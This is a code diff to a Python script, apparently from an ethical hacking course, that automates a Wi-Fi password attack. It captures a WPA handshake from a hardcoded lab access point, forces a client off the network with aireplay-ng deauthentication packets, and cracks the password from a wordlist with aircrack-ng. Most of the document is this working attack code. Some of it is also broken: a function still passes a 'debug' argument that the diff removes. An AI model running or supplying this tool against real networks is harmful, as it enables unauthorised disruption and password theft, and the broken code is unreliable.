@@ -5,6 +5,7 @@ import tempfile
 import atexit
 # import pandas
 import time
+import re # regex to validate MAC addresses
 
 
 ###############################################################
@@ -13,7 +14,7 @@ import time
 packetPath = ""
 
 # Specify path to custom dictionary for cracking
-# Default: Uses included dictionary
+# Default: Uses included dictionary (if dictionary.txt exists)
 dictionaryPath = ""
 
 # Specify file to store passwords in
@@ -27,13 +28,13 @@ interfaceName = ""
 
 # Specify access point MAC address (BSSID) to target
 # Default: Present user with detected access points to choose from
-# routerBSSID = "10:BF:48:D3:93:B8" # CS378-EthicalHacking-GDC-2.212
-routerBSSID = ""
+targetBSSID = "10:BF:48:D3:93:B8" # CS378-EthicalHacking-GDC-2.212
+# targetBSSID = ""
 
 # Specify channel to scan on
 # Default: Prompt user to choose channel or scan all channels
-# channel = "6"
-channel = ""
+channel = "6"
+# channel = ""
 ###############################################################
 
 
@@ -42,8 +43,8 @@ def main():
 		sys.exit('Please run as root')
 	try:
 		environmentSetup()
-		killInterference()
-		while routerBSSID == "" or channel == "":
+		# killInterference()
+		while targetBSSID == "" or channel == "":
 			getTargetAccessPoint()
 		captureHandshake()
 		crackHandshake()
@@ -56,13 +57,11 @@ def is_valid_path(parser, arg):
         parser.error("The path %s does not exist!" % arg)
 
 
-def bash_command(cmd, debug=False):
-	if debug:
-		process = subprocess.Popen(['/bin/bash', '-c', cmd])
-	else:
-		process = subprocess.Popen(['/bin/bash', '-c', cmd],
-				stdout=subprocess.PIPE,
-				stderr=subprocess.PIPE)
+def bash_command(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
+	process = subprocess.Popen(cmd.split(),
+			stdout=stdout,
+			stderr=stderr,
+			stdin=stdin)
 	return process
 
 
@@ -110,14 +109,19 @@ def environmentSetup():
 			os.makedirs(os.getcwd() + "/packets")
 		packetPath = os.getcwd() + "/packets/"
 	# use included dictionary
-	if not dictionaryPath and os.path.isfile(os.getcwd() + "/dictionary.txt"):
-		dictionaryPath = os.getcwd() + "/dictionary.txt"
+	if not dictionaryPath:
+		if os.path.isfile(os.getcwd() + "/dictionary.txt"):
+			dictionaryPath = os.getcwd() + "/dictionary.txt"
+		else:
+			dictionaryPath = os.getcwd() + "/" + input("Please specify wordlist for dictionary crack: ")
+		while not os.path.isfile(dictionaryPath):
+			dictionaryPath = os.getcwd() + "/" + input(dictionaryPath + " does not exist. Please try again: ")
 	# use default passwords file
 	if not passwordsPath and os.path.isfile(os.getcwd() + "/passwords.txt"):
 		# TODO: Make passwords.txt file if there isn't one
 		passwordsPath = os.getcwd() + "/passwords.txt"
 
-	# get interfaceName
+	# get name of wireless interface to use
 	# getInterfaceName() should raise exception if no compatible device found
 	if interfaceName == '':
 		print("Listing interfaces...")
@@ -165,7 +169,7 @@ def getTargetAccessPoint():
 	''' airdump setup '''
 	global interfaceName
 	global channel
-	global routerBSSID
+	global targetBSSID
 
 	while True:
 		while channel == '':
@@ -180,7 +184,8 @@ def getTargetAccessPoint():
 			break
 
 	# Get MAC address of the target access point (router)
-	routerBSSID = input("Please select access point MAC address (BSSID 1): ")
+	while not validMacAddress(targetBSSID):
+		targetBSSID = input("Please select access point MAC address (BSSID 1): ")
 
 
 def scanAccessPoints(interfaceName, channel):
@@ -199,12 +204,14 @@ def scanAccessPoints(interfaceName, channel):
 				" -c " + str(channel) +
 				" --output-format csv" +
 				" -w " + packetPath + "dump" +
-				" " + interfaceName)
+				" " + interfaceName,
+				debug = True)
 	else:
 		airodump = bash_command("airodump-ng" +
 				" --output-format csv" +
 				" -w " + packetPath + "dump" +
-				" " + interfaceName)
+				" " + interfaceName,
+				debug = True)
 	time.sleep(int(scanTime))
 	airodump.terminate()
 	print("Scan complete.")
@@ -278,40 +285,39 @@ def getInterfaceName():
 
 
 def captureHandshake():
-	global routerBSSID
+	global targetBSSID
 	global interfaceName
 
-	clientBSSID = scanClientsForAccessPoint()
+	print("Starting packet dump of AP: " + targetBSSID)
 	airodump_proc = bash_command("airodump-ng" +
 			" -c " + str(channel) +
-			" --bssid " + str(routerBSSID) +
+			" --bssid " + str(targetBSSID) +
 			" --output-format cap" +
 			" -w " + packetPath + "packet" +
 			" " + str(interfaceName))
-	time.sleep(2)
-	deauthenticateClient(clientBSSID)
+	clientMacAddress = scanClientsForAccessPoint()
+	deauthenticateClient(clientMacAddress)
 	time.sleep(8)
+	print("Killing packet dump of AP: " + targetBSSID)
 	airodump_proc.terminate()
 
 
-def scanClientsForAccessPoint(routerESSID=None):
-	global routerBSSID
+def scanClientsForAccessPoint(targetESSID=None):
+	global targetBSSID
 	global channel
 	global interfaceName
 
-	print("Using interface: " + interfaceName)
-
 	# Allow user to select an AP (access point) by MAC address
-	if routerESSID == None or routerESSID == '':
-		print("Scanning clients connected to access point " + routerBSSID + "...")
+	if targetESSID == None or targetESSID == '':
+		print("Scanning clients connected to access point " + targetBSSID + "...")
 	else:
-		print("Scanning clients connected to access point " + routerESSID + "...")
+		print("Scanning clients connected to access point " + targetESSID + "...")
 
 	# List all clients connected to target AP
 	scanTime = ''
 	while not scanTime.isdigit():
-		scanTime = input("Time limit to listen: ")
-	process = bash_command("airodump-ng -c " + str(channel) + " --bssid " + str(routerBSSID) + " " + str(interfaceName), debug=True)
+		scanTime = input("Time limit to listen (seconds): ")
+	process = bash_command("airodump-ng -c " + str(channel) + " --bssid " + str(targetBSSID) + " " + str(interfaceName), stdout=None, stderr=None)
 	time.sleep(int(scanTime))
 	process.terminate()
 
@@ -324,34 +330,39 @@ def scanClientsForAccessPoint(routerESSID=None):
 	# essids = accessPoints.ESSID.tolist()
 	# print(bssids)
 	# print("\n\n" + essids)
-	clientBSSID = input("Please select client (BSSID 2) to deauthenticate: ")
-	# TODO: Parse input - insert colon delimiters, make all-caps?
+	clientMacAddress = ''
+	while not validMacAddress(clientMacAddress):
+		clientMacAddress = input("Please select client (BSSID 2) to deauthenticate: ")
 
-	return clientBSSID
+	return clientMacAddress
 
 
-def deauthenticateClient(clientBSSID, routerESSID=None):
-	global routerBSSID
+def deauthenticateClient(clientMacAddress, targetESSID=None):
+	global targetBSSID
 	global interfaceName
 	global channel
 
-	if routerESSID == None or routerESSID == '':
-		print("Deauthenticating client " + clientBSSID + " at AP " + routerBSSID)
+	if targetESSID == None or targetESSID == '':
+		print("Deauthenticating client " + clientMacAddress + " at AP " + targetBSSID)
 	else:
-		print("Deauthenticating client " + clientBSSID + " at AP " + routerESSID)
+		print("Deauthenticating client " + clientMacAddress + " at AP " + targetESSID)
 
-	aireplay_proc = bash_command("aireplay-ng -0 1 -a " + routerBSSID + " -c " + clientBSSID + " " + interfaceName)
+	aireplay_proc = bash_command("aireplay-ng" + 
+			" -0 1" + # send 1 deauth packet
+			" -a " + targetBSSID +
+			" -c " + clientMacAddress +
+			" " + interfaceName)
 	print(aireplay_proc.stdout.read().decode('utf-8').strip())
+
+def validMacAddress(address):
+	return re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", address.lower())
 
 
 def crackHandshake():
-	global routerBSSID, dictionaryPath
-	if dictionaryPath == "":
-		process = bash_command("ls")
-		print(process.stdout.read().decode('utf-8'))
-		dictionaryPath = input("Please specify wordlist for dictionary crack: ")
-	print("aircrack-ng -w " + dictionaryPath + " -b " + routerBSSID + " " + packetPath + "packet-01.cap")
-	process = bash_command("aircrack-ng -w " + dictionaryPath + " -b " + routerBSSID + " packet-01.cap")
+	global targetBSSID
+	global dictionaryPath
+
+	process = bash_command("aircrack-ng -w " + dictionaryPath + " -b " + targetBSSID + " " + packetPath + "packet-01.cap", stderr=None)
 	print(process.stdout.read().decode('utf-8'))
 
 def cleanUp():
